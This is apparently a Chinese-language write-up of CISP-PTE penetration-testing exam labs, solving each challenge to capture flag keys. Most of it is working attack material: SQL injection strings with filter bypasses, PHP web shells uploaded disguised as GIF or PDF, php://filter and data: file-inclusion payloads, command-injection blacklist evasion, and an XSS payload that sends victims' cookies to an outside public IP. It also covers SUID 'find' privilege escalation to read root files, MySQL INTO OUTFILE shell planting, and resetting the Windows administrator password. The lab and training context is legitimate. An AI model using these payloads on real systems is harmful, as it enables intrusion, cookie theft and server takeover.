# http://10.11.0.92:1001~1005/

## 1、http://10.11.0.92:1001

SQL注入，先注册一个用户，注册完后登陆进去让我们写文章

![image-20221226164405549](F:/Typora_pic/pte/image-20221226164405549.png)

![image-20221226164440612](F:/Typora_pic/pte/image-20221226164440612.png)

```
1',database(),'login');-- -
```

先随便写一下1和2，写进去之后猜测插入语句的结构

![image-20221226164544417](F:/Typora_pic/pte/image-20221226164544417.png)

2web

库名出来之后，用group_concat把表名弄出来

```
1',(select group_concat(table_name) from information_schema.tables where table_schema=database()),'login');-- -
```

写入失败了，猜测是select被过滤了

```
1',(seselectlect group_concat(table_name) from information_schema.tables where table_schema=database()),'login');-- -
```

用双写还是不行

```
1',(SeLEct group_concat(table_name) from information_schema.tables where table_schema=database()),'login');-- -
```

换成大小写混用就出来了

![image-20221226164755564](F:/Typora_pic/pte/image-20221226164755564.png)



article,article1,users1

表名出来后继续弄字段名

```
1',(SeLEct group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users1'),'login');-- -
```

![image-20221226164832962](F:/Typora_pic/pte/image-20221226164832962.png)

password,username

字段出来了，直接打印出来就好了

```
1',(SeLEct group_concat(password,username) from 2web.users1 limit 1),'login');-- -
1',(SeLEct password from 2web.users1 limit 1),'login');-- -
```

![image-20221226170319505](F:/Typora_pic/pte/image-20221226170319505.png)

**key1:{fkm5dnr6}**

## 2、http://10.11.0.92:1002

![image-20221224190534306](F:/Typora_pic/pte/image-20221224190534306.png)

这题是文件上传，直接用传文件，用BP拦截下来，拓展名改一下**new.php**

要注意会过滤eval，所以我们换**system**

改一下文件类型

```php+HTML
Content-Type: image/gif

GIF89a
<?php @eval($_POST[1]);?>
```

**key2:ef85ndsq**

## 3、http://10.11.0.92:1003

![image-20221224190602049](F:/Typora_pic/pte/image-20221224190602049.png)

这题是文件包含，先看url，有个文件view.html

http://10.11.0.92:1003/start/index.php?file=view.html

http://10.11.0.92:1003/start/view.html

右键查看源代码

```php+HTML
<?php 
@$a = $_POST['Hello']; 
if(isset($a)){ 
@preg_replace("/\[(.*)\]/e",'\\1',base64_decode('W0BldmFsKGJhc2U2NF9kZWNvZGUoJF9QT1NUW3owXSkpO10=')); 
} 
?>
Hello
<br>
Are you ok?
```

代码审计，判断有没有$a，过滤一些符号，然后解密一段base64

看下base64是什么

```php
[@eval(base64_decode($_POST[z0]));]
```

是一句话木马，用POST传了z0

我们回到原来的页面试一下

先传一个 **Hello** ，然后用 **&** 符号连接起来，再跟一个 **z0**

![image-20221224104727583](F:/Typora_pic/pte/image-20221224104727583.png)

没反应，嗯，要把传进去的z0进行base64，因为他会decode

![image-20221224104945075](F:/Typora_pic/pte/image-20221224104945075.png)

传进去了，审题一下，key在根目录下直接用

```php
system('ls -a');
Hello=1&z0=c3lzdGVtKCdscyAtYScpOw==
system('ls -a ../');
Hello=1&z0=c3lzdGVtKCdscyAtYSAuLi8nKTs=
system('cat ../key.php');
Hello=1&z0=c3lzdGVtKCdjYXQgLi4va2V5LnBocCcpOw==
```

![image-20221224105547110](F:/Typora_pic/pte/image-20221224105547110.png)

右键查看源代码

**key3:ce8nrwd7**

## 4、http://10.11.0.92:1004

这题是代码审计，先把前端显示贴过来

```php+HTML
0 <?php
    header("Content-type:text/html;charset=utf-8"); 
    /*
    Hint:
    get the shell find the key；）\n";
    */
    echo strlen($_GET['cmd']);
    if (isset($_GET['cmd']) && strlen($_GET['cmd']) <= 30) {
        @exec($_GET['cmd']);
    }
    highlight_file(__FILE__);
    
echo "<br /> IP : {$_SERVER['REMOTE_ADDR']}";

IP : 10.11.0.10
```

提示让我们找到key，审计一下，判断GET传参cmd和传进去的cmd的长度

中间会exec执行，长度要小于30

直接传命令就好了

![image-20221224110146370](F:/Typora_pic/pte/image-20221224110146370.png)

exec是没有回显的，尝试一下把命令结果输出到文件

然后直接去访问这个文件

![image-20221224110246100](F:/Typora_pic/pte/image-20221224110246100.png)

有回显了，可以看到这里有个key4，感觉是假的

再找一下

```php
<?php
	error_reporting(0);
	echo "key4:azwefwny";
?>
```

找到了，路径是../admin下的backdoor

注意exec执行backdoor的时候会被过滤

所以要用星号代替

```
http://10.11.0.92:1004/start/vul.php?cmd=cat ../admin/b*> 1.txt
```

**key4:azwefwny**

## 5、http://10.11.0.92:1005

这题是命令执行，先常规杠个c试一下

确实是linux系统用 **|** 和 **&** 试一下

![image-20221224112520076](F:/Typora_pic/pte/image-20221224112520076.png)

127.0.0.1 -c 1 |

![image-20221224112656489](F:/Typora_pic/pte/image-20221224112656489.png)



127.0.0.1 -c 1 &

![image-20221224113059941](F:/Typora_pic/pte/image-20221224113059941.png)

可以看到管道符给过滤了

尝试在后边加命令

127.0.0.1 -c 1 & l''s -al

![image-20221224113210282](F:/Typora_pic/pte/image-20221224113210282.png)

127.0.0.1 -c 1 & c''at ../key.p''hp

![image-20221224113235848](F:/Typora_pic/pte/image-20221224113235848.png)

把文件找到，然后cat和php都是黑名单，用两个单引号过滤，或者用单引号分隔过滤

右键查看源代码

**key5:acsq3fd5**

# http://10.11.0.168:81~85/

## 1、http://10.11.0.168:81

继续是注入

![image-20221226165124857](F:/Typora_pic/pte/image-20221226165124857.png)

和前面那题大相径庭，注册个用户写文章，主义提示我们过滤了双横杠注释和井号注释

![image-20221226165215132](F:/Typora_pic/pte/image-20221226165215132.png)

照例先随便输入点东西看看，注释的话因为同时过滤了减号和井号，那我们吧这两个结合起来

会把插入的语句展示给我们看

![image-20221226165453881](F:/Typora_pic/pte/image-20221226165453881.png)

那我们尝试一下截断写入

注释的话因为同时过滤了减号和井号，那我们吧这两个结合起来

```
s','22','login'); -#- -
```

![image-20221226165432981](F:/Typora_pic/pte/image-20221226165432981.png)

![image-20221226165542702](F:/Typora_pic/pte/image-20221226165542702.png)

两个都写进去了，那就先看下数据库

```
s',database(),'login'); -#- -
```

![image-20221226165623240](F:/Typora_pic/pte/image-20221226165623240.png)

2web

数据库出来了我们直接猜注表名

```
s',(select group_concat(table_name) from information_schema.tables where table_schema=database()),'login'); -#- -
```

![image-20221226165801390](F:/Typora_pic/pte/image-20221226165801390.png)

article,article1,users1

表名出来了，继续注字段

```
s',(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users1'),'login'); -#- -
```

![image-20221226170201313](F:/Typora_pic/pte/image-20221226170201313.png)

username,password

表的字段出来了，直接查询这个表的内容

```
1',(SeLEct group_concat(password,username) from 2web.users1 limit 1),'login');-#- -
```

![image-20221226170241956](F:/Typora_pic/pte/image-20221226170241956.png)

**key1:u9y8tr4n**

## 2、http://10.11.0.168:82

依旧是文件上传

![image-20221224114127103](F:/Typora_pic/pte/image-20221224114127103.png)

和前面是一样的，不解释

**key2:adahhsh8**

## 3、http://10.11.0.168:83

这题是文件包含

直接看url，page传了一个文件

http://10.11.0.168:83/start/index.php?page=hello

![image-20221224114408685](F:/Typora_pic/pte/image-20221224114408685.png)

但是显示出来却新出现了txt，随便换个关键词试一下

![image-20221224114517447](F:/Typora_pic/pte/image-20221224114517447.png)

还是有，直接伪协议试一下

![image-20221224114620731](F:/Typora_pic/pte/image-20221224114620731.png)

phpinfo直接出来了，找key

```php+HTML
data:text/plain, <?php system('cat ../key.php');?>
```

**key3:bvz4s9qy**

## 4、http://10.11.0.168:84

这题的题目写着反序列化漏洞，但是却给了一段php代码

先贴给我们看的这段

```php
<?php
error_reporting(0);
include "key4.php";
$PTE = "CISP-PTE";
$str = $_GET['str'];
if (unserialize($str) === "$PTE")
{
    echo "$key4";
}
show_source(__FILE__); 
```

序列化都懂啊，就是把一串字符串具体的记录起来，是什么类型，有多少字节，是什么内容记录下来

代码审计一下，这里包含了一个文件，判断了get传进来的str反序列化是否和PTE的内容相等

直接数一下就好了，然后用get的方式传进去

http://10.11.0.168:84/start/vul.php?str=s:8:"CISP-PTE";

```php
s:8:"CISP-PTE";
```

![image-20221224115121924](F:/Typora_pic/pte/image-20221224115121924.png)

**key4:pw3yx7fa**

## 5、http://10.11.0.168:85

这题叫失效的访问控制，在参加PTE考试的时候是没有做出来的，根据现场老师的说法是用以前的做法做不出来，此处留个心眼

![image-20221224115320137](F:/Typora_pic/pte/image-20221224115320137.png)

无权查看key，那就过一下bp

![image-20221224115441605](F:/Typora_pic/pte/image-20221224115441605.png)

可以看到有两个cookie，一个是判断是否是admin，另一个是base64的guest

把false改成true，把guest改成admin再base64加密一下传回去

![image-20221224115644786](F:/Typora_pic/pte/image-20221224115644786.png)

这题考试的时候是原题，但是我在这里跑了一个字典都没有跑出来，事后培训的老师说有可能是大小写混用加密，例如：aDmIn

这种，留个心眼

**key5:m9gbqjr6**

2022年12月25日补充

由同学提出的解题思路，先简单复述一遍，就是这个用户名被藏在字典里了，是非常规的用户，需要用BP跑字典，下面是复现

http://49.234.52.232:85/start/

![image-20221225151248772](F:/Typora_pic/pte/image-20221225151248772.png)

![image-20221225151344541](F:/Typora_pic/pte/image-20221225151344541.png)

然后用BP抓一下访问的包

![image-20221225151424070](F:/Typora_pic/pte/image-20221225151424070.png)

抓到之后Ctrl+i丢进爆破里，设置一下变量

![image-20221225151450332](F:/Typora_pic/pte/image-20221225151450332.png)

导入字典，设置base64-encode

![image-20221225151606654](F:/Typora_pic/pte/image-20221225151606654.png)

然后在option里设置返回值模块

![image-20221225151645501](F:/Typora_pic/pte/image-20221225151645501.png)

extract设置成显示key的地方

![image-20221225151730170](F:/Typora_pic/pte/image-20221225151730170.png)

然后跑爆破

![image-20221225151754722](F:/Typora_pic/pte/image-20221225151754722.png)

得到key

**key{m9gbqjr6}**

# http://10.11.0.155:81~85

## 1、http://10.11.0.155:81

依旧是注入，直接看题目，选中一篇文章点浏览该文章后，通过post传入了base64的编码，通过url转换MQ%3d%3d和base64转换之后可以知道这个值是1

![image-20221226170422146](F:/Typora_pic/pte/image-20221226170422146.png)

再看下其他的文章，Mg%3D%3D是2

![image-20221226170621942](F:/Typora_pic/pte/image-20221226170621942.png)

Mw%3D%3D是3，加上这里的提示，我们可以猜测到注入的时候需要把注入点进行base64加密

![image-20221226170655310](F:/Typora_pic/pte/image-20221226170655310.png)

那么我们接上提示，order by猜测有多少个字段

![image-20221226171018178](F:/Typora_pic/pte/image-20221226171018178.png)

一直猜测到8是没报错的

![image-20221226171121191](F:/Typora_pic/pte/image-20221226171121191.png)

9的时候就报错了，我这里为了截图演示把base64加密过后的注入转换了回来

那么我们现在知道一共有八个字段，那么有几个字段是显示出来了的，可以用联合查询试一下

![image-20221226171300626](F:/Typora_pic/pte/image-20221226171300626.png)

报错了，可能是过滤了联合查询，用错误的语法尝试了一下之后，可以知道这里过滤了union

![image-20221226171446651](F:/Typora_pic/pte/image-20221226171446651.png)

这里本应该报错的，没有报错就证明union被过滤了

那么们双写，加上大小写过一下（这里select可以不用大小写）

```
3'%")ununionion SeLeCt 1,2,3,4,5,6,7,8 -- -
```

![image-20221226171620940](F:/Typora_pic/pte/image-20221226171620940.png)

出来了就很简单了，依次把库名、表名、字段名注入出来就可以了

```
3'%")ununionion SeLeCt 1,database(),3,4,5,6,7,8 -- -
```

![image-20221226171729167](F:/Typora_pic/pte/image-20221226171729167.png)

uinfo

```
3'%")ununionion SeLeCt 1,database(),(select group_concat(table_name) from information_schema.tables where table_schema=database()),4,5,6,7,8 -- -
```

![image-20221226171808652](F:/Typora_pic/pte/image-20221226171808652.png)

article

```
id=3'%")ununionion SeLeCt 1,database(),(select group_concat(column_name) from information_schema.columns where table_schema=database() anandd table_name='article'),4,5,6,7,8 -- -
```

![image-20221226171846584](F:/Typora_pic/pte/image-20221226171846584.png)

author,content,id,key,nid,oid,tid,title

最后这里就很简单了，把key注入出来就好了，正当我这么想的时候，啪一下打脸就来了

![image-20221226172019434](F:/Typora_pic/pte/image-20221226172019434.png)

报错了，后来才知道key在sql里是关键词，查询的时候会被过滤，所以需要用英文全角引号括起来**转义**，就是键盘上的波浪号，要用英文输入法才能打出来 "**`**" 

知道这点后再注入就不会报错了

```
3'%")ununionion SeLeCt 1,2,3,(select `key` from uinfo.article limit 1),5,6,7,8 -- -
```

![image-20221226172333140](F:/Typora_pic/pte/image-20221226172333140.png)

**key1:cgrhpynd**

## 2、http://10.11.0.155:82

![image-20221224121826480](F:/Typora_pic/pte/image-20221224121826480.png)

这里提示了我们文件名会通过md5一到十万的随机数重命名存储在当前目录下

那思路就是通过BP，一直上传，同时开另外一个一直访问

![image-20221224122107083](F:/Typora_pic/pte/image-20221224122107083.png)

先传一个试一下，然后把这个发送到爆破里，设置成null payload一直发包就好了

然后我们抓一个访问上传页面的包，设置一下变量和payload

![image-20221224122358185](F:/Typora_pic/pte/image-20221224122358185.png)

![image-20221224122504615](F:/Typora_pic/pte/image-20221224122504615.png)

主义设置process的时候文件名一定要是上传的文件名，这个文件名会被MD5加密，前面变量设置的名字是无所谓的，这里才是关键，注意变量名后边要跟**.php**

两个爆破同时攻击![image-20221224122700937](F:/Typora_pic/pte/image-20221224122700937.png)

状态码200了就是访问到了，我们点开一个看下文件名复制出来访问一下

![image-20221224122812741](F:/Typora_pic/pte/image-20221224122812741.png)

直接找一下cat key就好了

```php
<?php
//key2:5jdpm8zc
?>
```

**key2:5jdpm8zc**

## 3、http://10.11.0.155:83

这题是文件包含

![image-20221224122951011](F:/Typora_pic/pte/image-20221224122951011.png)

上来就包含了一个hello.html，那我们试一下/etc/passwd

![image-20221224123020608](F:/Typora_pic/pte/image-20221224123020608.png)

是可以的，那审题一下，直接包含key.php

![image-20221224123135004](F:/Typora_pic/pte/image-20221224123135004.png)

显示了get it但是源代码里没有，估计是PHP代码被解析了

用伪代码加密一下

```html
php://filter/read=convert.base64-encode/resource=../key.php
R2V0IGl0IQ0KPD9waHANCg0KLy9rZXkzOmZrZGI5bmV1DQo/Pg0K 
```

用base64解密一下

**key3:fkdb9neu**

## 4、http://10.11.0.155:84

这题是XSS漏洞，在测试环境下可以用公网弹个shell回来

先在公网服务器上开启端口监听

python -m http.server 30000

```json
<script>document.location='http://139.159.231.138:30000/?cookie='+document.cookie; alert('getit')</script>
<script>document.write('<img src="http://139.159.231.138:30000/?cookie='+document.cookie+'"/>');alert('getit');</script>
```

![image-20221224124848604](F:/Typora_pic/pte/image-20221224124848604.png)

注意这个如果用location可能弹不回来，考试的时候用img就好了

**key4=duzr5k3s**

## 5、http://10.11.0.155:85

[这题同http://10.11.0.92:1005](http://10.11.0.92:1005)

# http://10.11.0.236/

渗透大题，给了个地址，直接访问一下

![image-20221224125157461](F:/Typora_pic/pte/image-20221224125157461.png)

限制用域名访问

丢进御剑目录扫描一下

![image-20221224125457432](F:/Typora_pic/pte/image-20221224125457432.png)

扫出来个robots.txt，直接访问一下

![image-20221224125603150](F:/Typora_pic/pte/image-20221224125603150.png)

**key6:qf8nswqe**

http://www.cisp.pte/

![image-20221224125717625](F:/Typora_pic/pte/image-20221224125717625.png)

用域名访问一下之后，继续丢进御剑里扫描一下目录

![image-20221224125804935](F:/Typora_pic/pte/image-20221224125804935.png)

又有一个robots.txt，访问一下

![image-20221224125801193](F:/Typora_pic/pte/image-20221224125801193.png)

访问一下这个页面

![image-20221224125851422](F:/Typora_pic/pte/image-20221224125851422.png)

额，用BP上传一下

![image-20221224130019266](F:/Typora_pic/pte/image-20221224130019266.png)

一句话上传成功之后给出一个目录，同时在上传的时候在注释里发现了备份文件

![image-20221224130157292](F:/Typora_pic/pte/image-20221224130157292.png)

下载之后审计一下

![image-20221224130229030](F:/Typora_pic/pte/image-20221224130229030.png)

可以看到文件上传之后在upload文件夹下被随机数一到一百的md5加密值拼接加密

那么如法炮制，写一个跨级目录写文件的一句话传上去

```php
<?php fputs(fopen('../ifconfig.php','w'),'<?php @eval($_POST[1]);?>');?>
```

抓一个访问的包，访问爆破，双卡交火两个爆破一起跑

![image-20221224131127169](F:/Typora_pic/pte/image-20221224131127169.png)

执行之后直接访问一下根目录看看有没有ifconfig文件

传个参试一下

![image-20221224131224855](F:/Typora_pic/pte/image-20221224131224855.png)

用蚁剑连一下

![image-20221224131322643](F:/Typora_pic/pte/image-20221224131322643.png)

key就在这个根文件夹下

**hi key7 n8nwmpqd**

只剩下一个提权的key了，这里可以在phpinfo里看一下

![image-20221224172000524](F:/Typora_pic/pte/image-20221224172000524.png)

禁用了好多参数

![image-20221224172046174](F:/Typora_pic/pte/image-20221224172046174.png)

pcntl爱开着，可以用这个

直接用蚁剑新建两个文件

```php
<?php pcntl_exec("/bin/bash",array("/home/wwwroot/ok/ifconfig.sh"));?>
```

这个新的文件是调用目录下的ifconfig.sh

```
find / -perm /4000 -ls > ifconfig.txt
```

在浏览器里访问这个页面

![image-20221224173314882](F:/Typora_pic/pte/image-20221224173314882.png)

显示服务器错误不要紧，页面响应了

提权的命令执行了，直接看下生成的文件

![image-20221224173459565](F:/Typora_pic/pte/image-20221224173459565.png)

既然是需要提权的key，应该在root目录下，修改一下命令

```
find /etc/passwd -exec  ls /root \; > ifconfig.txt
```

![image-20221224173721709](F:/Typora_pic/pte/image-20221224173721709.png)

果然有，再修改一下命，把它cat出来

```
find /etc/passwd -exec  cat /root/key8 \; > ifconfig.txt
```

访问第二个php文件调用一下sh文件，访问一下生成的文件

![image-20221224173854969](F:/Typora_pic/pte/image-20221224173854969.png)

**key8:nasmc8aw**

# http://10.11.0.242/

继续是渗透大题，给了一个地址，直接访问一下，然后丢进御剑里

![image-20221224174016938](F:/Typora_pic/pte/image-20221224174016938.png)

![image-20221224174210934](F:/Typora_pic/pte/image-20221224174210934.png)

挺多东西的，看下哪些是有用的访问一下

先访问一下robots.txt

![image-20221224174351492](F:/Typora_pic/pte/image-20221224174351492.png)

有个数据库文件，下载下来

![image-20221224174426559](F:/Typora_pic/pte/image-20221224174426559.png)

记录了密码和数据库的结构，没什么用属于干扰项，

直接下一个去phpmyadmin

![image-20221224174520845](F:/Typora_pic/pte/image-20221224174520845.png)

弱口令默认密码root&toor就进去了

看一下数据库

![image-20221224174618099](F:/Typora_pic/pte/image-20221224174618099.png)

**key6:st3mmq73**

从马后炮的角度来讲，如果做了nmap的系统扫描，可以知道这个服务器是windows操作系统

那么在数据库里就可以用outfile来上传一句话木马，前提是知道了绝对路径和开启了联合查询

那么就可以简单尝试一下

```
select '<?php @eval($_POST[1]);?>' into outfile "C:\\wamp\\www\\test.php";
```

![image-20221226173343573](F:/Typora_pic/pte/image-20221226173343573.png)



![image-20221226173314584](F:/Typora_pic/pte/image-20221226173314584.png)



在库里找一下登陆的用户

![image-20221224174839946](F:/Typora_pic/pte/image-20221224174839946.png)

密码是MD5加密的，添加一个用户试一下，复制了一行之后登陆进去了

找到上传点，用BP拦截上传一下文件，注意一下这里同时过滤了eval和system

这里可以用**assert**

![image-20221224175934027](F:/Typora_pic/pte/image-20221224175934027.png)

```php+HTML
Content-Disposition: form-data; name="file[]"; filename="new.php"
Content-Type: image/gif

GIF89a
<?php @assert($_POST[1]);?>
```

![image-20221224180026829](F:/Typora_pic/pte/image-20221224180026829.png)

传上去了，用蚁剑连一下，翻一下目录

![image-20221224180457835](F:/Typora_pic/pte/image-20221224180457835.png)

**$key7="qvub98ym"**

最后一个key是要提权的，从蚁剑看到这个系统其实是windows的，那么key应该是在administrator的文件夹里

先用终端随便翻一下，额后期的这里服务器太卡了，不知道是什么情况

简单说一下就是这里可以用修改administrator的密码然后用3389连进去

key就在administrator桌面的垃圾桶里边，个别情况可以用蚁剑的终端直接访问C盘下的文件可以看见明文，大部分情况下是被编译了看不见

所以最稳妥的方案就是修改管理员的密码远程连接进去，把回收站的文件拖出来之后查看

**key8:gbd43v74**



# http://10.11.0.205/

依旧是渗透大题，直接访问，并且丢进蚁剑里，这题还需要扫描一下端口

![image-20221224182304360](F:/Typora_pic/pte/image-20221224182304360.png)

一个挂号系统，啥也没有，看看御剑，扫出来一个php的登陆页面

![image-20221224183640973](F:/Typora_pic/pte/image-20221224183640973.png)

![image-20221224182434857](F:/Typora_pic/pte/image-20221224182434857.png)

从马后炮的结果来说可以用这个注入语句

```sql
'union select 1,2,md5(3),4,5,6,7,8,9-- -
```

![image-20221224182942486](F:/Typora_pic/pte/image-20221224182942486.png)

![image-20221224182952431](F:/Typora_pic/pte/image-20221224182952431.png)

**key6:t7kxer7z**

Nmap会扫描出几个特殊端口和服务

我现在这里没有，应该有3306，21，6721

![image-20221224182429574](F:/Typora_pic/pte/image-20221224182429574.png)



![image-20221224182600337](F:/Typora_pic/pte/image-20221224182600337.png)


这个用户名密码连接一下，连不上，是假的

访问那个非常规端口http://10.11.0.205:6721![image-20221224183152343](F:/Typora_pic/pte/image-20221224183152343.png)

这个页面要用Chrome访问才能显示完全，不过右键查看源代码一样能看到下一跳**api/query_pdf.php**

![image-20221224183258432](F:/Typora_pic/pte/image-20221224183258432.png)

按照提示传参

![image-20221224183344292](F:/Typora_pic/pte/image-20221224183344292.png)

这个时候回到御剑，御剑里有个扫描出来的phpinfo

![image-20221224183743951](F:/Typora_pic/pte/image-20221224183743951.png)

phpinfo.php的存放目录就在document_root里，那么用伪代码传参的时候就要吧路径带上，加进去试一下

php://filter/read=convert.base64-encode/resource=/usr/share/nginx/PIzABXDg/phpinfo.php

![image-20221224183852144](F:/Typora_pic/pte/image-20221224183852144.png)

解密出来就是 <?php phpinfo(); ?>

那么找一下key文件

archive=php://filter/read=convert.base64-encode/resource=/usr/share/nginx/PIzABXDg/key.php

![image-20221224184005462](F:/Typora_pic/pte/image-20221224184005462.png)

丢进BP里解密一下

```php+HTML
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>KETå¨è¿é</title>
</head>
<body>
	<h1 style="color: red;">KEYå°±å¨è¿é</h1>
</body>
</html>

<?php
// key7:h57xjzsn
?> 
```

**key7:h57xjzsn**

最后一个key是要提权的，这个时候回到挂号查询系统里，找到档案管理，上传一个pdf的一句话

![image-20221224184338894](F:/Typora_pic/pte/image-20221224184338894.png)

可是上传了之后我们并不知道上传的路径是什么，为了知道上传的路径，我们用上边的文件包含把这个上传页面包含解密，审计一下代码

archive=php://filter/read=convert.base64-encode/resource=/usr/share/nginx/PIzABXDg/index.php

```php+HTML
<?php require('config.php');?>
<?php include('lib/functions.php');?>
<?php require('lib/mysql.class.php');?>
<?php
ini_set("display_errors","On");
error_reporting(E_ALL);
@extract($_GET,EXTR_PREFIX_ALL,"g");
if(isset($_POST['submit']) || isset($g_submit)){
  @check_post_request();
  @extract($_POST,EXTR_PREFIX_ALL,"p");
}

if(!isset($_SESSION))
  session_start();
  
$db = new c_mysql;

$config = $db->select_one('config');

$g_m = (isset($g_m) && in_array_key($g_m,$models)) ? $g_m : 'order';
$g_o = isset($g_o) ? $g_o : 'list';

if($g_m != 'login' && ($g_m == 'order' && $g_o != 'add'))
  if(!isset($_SESSION['uid'])){
    header('Location:?m=login');
	exit();
  }
if(isset($_SESSION['uid'])){
  $user = $db->select_one('user',array('uid' => $_SESSION['uid']));
  if(!$user)
    alert_goto('?m=login','æ²¡æè¿ä¸ªç¨æ·çè®°å½ï¼è¯·éæ°ç»å½ï¼');
}
include('model/'.$g_m.".php");

$operate_file = 'model/'.$g_m."_".$g_o.".php";
if(file_exists($operate_file))
  include($operate_file);

create_html();
?> 
```

这里看上传的文件被存到了$g_m和$g_o连接起来的目录里

回到浏览器看一下

![image-20221224184724794](F:/Typora_pic/pte/image-20221224184724794.png)

这里猜测m和o就是这里的$g_m和$g_o，再看代码的33行，还有一个model的目录

所以在文件包含里我们把原本的目录上加上这两个目录名/model/order_upload.php

archive=php://filter/read=convert.base64-encode/resource=/usr/share/nginx/PIzABXDg/model/order_upload.php

```php+HTML
<?php
$operates['upload'] = 'ä¸ä¼ æ¡£æ¡';

$target_dir = "CISP-PTE-1413/";
$info = '';

if(isset($_POST["submit"])) {

	$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
$uploadOk = 1;
$fileType = strtolower(pathinfo($target_file,PATHINFO_EXTENSION));
// Check if image file is a actual image or fake image
  // Check if file already exists
if (file_exists($target_file)) {
    $info = "æä»¶å·²ç»å­å¨";
    $uploadOk = 0;
}

// Allow certain file formats
if($fileType != "pdf") {
    $info = "åªåè®¸ä¸ä¼ PDFæä»¶";
    $uploadOk = 0;
}
// Check if $uploadOk is set to 0 by an error
if ($uploadOk == 0) {
} else {
    if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
        $info = basename( $_FILES["fileToUpload"]["name"]). " ä¸ä¼ æå";
    } else {
        $info = "ä¸ä¼ æä»¶æ¶åçéè¯¯";
    }
}
}

$main_tpl = "order_upload.htm";
$replace['{info}'] = $info;
?> 
```

这里看到第四行，确定了上传的pdf的目录CISP-PTE-1413

继续用文件包含，到这需要我们的一句话被解析，所以伪代码就不需要了可以去掉

![image-20221224185112044](F:/Typora_pic/pte/image-20221224185112044.png)

访问成功了，用find提权试一下

archive=/usr/share/nginx/PIzABXDg/CISP-PTE-1413/new.pdf&1=system('find / -perm /4000 -ls;');

![image-20221224185632804](F:/Typora_pic/pte/image-20221224185632804.png)

archive=/usr/share/nginx/PIzABXDg/CISP-PTE-1413/new.pdf&1=system('find /etc/passwd -exec cat /root/key8 \;');

![image-20221224185654119](F:/Typora_pic/pte/image-20221224185654119.png)**key8:5t7k48rw** 
